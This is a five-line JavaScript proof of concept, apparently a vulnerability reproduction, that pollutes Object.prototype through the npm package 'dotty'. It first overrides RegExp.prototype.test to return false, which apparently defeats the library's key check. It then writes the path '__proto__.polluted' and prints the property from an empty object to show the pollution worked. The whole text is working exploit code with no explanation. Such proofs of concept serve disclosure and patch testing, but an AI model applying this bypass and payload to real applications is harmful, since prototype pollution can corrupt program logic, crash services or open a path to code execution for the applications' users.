RegExp.prototype.test = () => false;
console.log({}.polluted);
const dotty = require('dotty');
dotty.put({}, '__proto__.polluted', 'yes');
console.log({}.polluted);